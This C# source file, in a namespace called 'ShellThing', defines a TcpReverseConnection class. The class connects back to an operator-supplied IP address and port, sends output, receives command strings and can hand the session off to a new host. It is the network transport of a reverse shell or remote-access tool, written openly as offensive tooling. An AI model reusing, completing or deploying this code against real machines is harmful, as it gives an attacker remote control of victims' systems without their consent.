using System;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Text;

namespace ShellThing
{
    public class TcpReverseConnection
    {
        public bool IsConnected { get; private set; } = false;

        private Socket socket;

        public void StartClient(string ipAddressString, string portString)
        {
            // Connect to a remote device.  
            try
            {
                // Establish the remote endpoint for the socket.
                IPAddress ipAddress = IPAddress.Parse(ipAddressString);
                int port = int.Parse(portString);
                IPEndPoint remoteEP = new IPEndPoint(ipAddress, port);

                // Create a TCP/IP  socket.  
                socket = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                // Connect the socket to the remote endpoint. Catch any errors.  
                try
                {
                    socket.Connect(remoteEP);
                    IsConnected = true;

                    Console.WriteLine("Socket connected to {0}", socket.RemoteEndPoint.ToString());

                }
                catch (ArgumentNullException ane)
                {
                    Console.WriteLine("ArgumentNullException : {0}", ane.ToString());
                }
                catch (SocketException se)
                {
                    Console.WriteLine("SocketException : {0}", se.ToString());
                }
                catch (Exception e)
                {
                    Console.WriteLine("Unexpected exception : {0}", e.ToString());
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        public void SendData(string data)
        {
            try
            {
                socket.Send(Encoding.ASCII.GetBytes(data));
            }
            catch (SocketException)
            {
                // TODO: add reconnect attempt or terminate
            }       
        }

        public string ReceiveData()
        {
            // Data buffer for incoming data.  
            byte[] bytes = new byte[1024];
            
            int bytesReceived = socket.Receive(bytes);
            string commandReceived = Encoding.ASCII.GetString(bytes, 0, bytesReceived);
            return commandReceived;
        }

        public void StopClient()
        {
            // Release the socket.  
            socket.Shutdown(SocketShutdown.Both);
            IsConnected = false;
            socket.Close();
        }

        public void HandoffConenection(string ipAddress, string portNumber)
        {
            Socket tempSocket = socket;

            try
            {
                StartClient(ipAddress, portNumber);
            }
            catch (Exception e)
            {
                SendData($"Handoff - Exception Starting new socket client: {e.Message}");
                socket = tempSocket;
            }

            // Sign off and close down current connection
            SendData("[+] New connection established successfully. Closing connection...");
            tempSocket.Shutdown(SocketShutdown.Both);
        }

        public static bool ValidateIpAddress(string ipAddress)
        {

            if (IPAddress.TryParse(ipAddress, out IPAddress address))
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public static bool ValidatePortNumber(string portNumber)
        {
            try
            {
                int port = Int32.Parse(portNumber);

                if (port > 0 && port <= 65535)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch (Exception)
            {
                return false;
            }
        }

    }
}
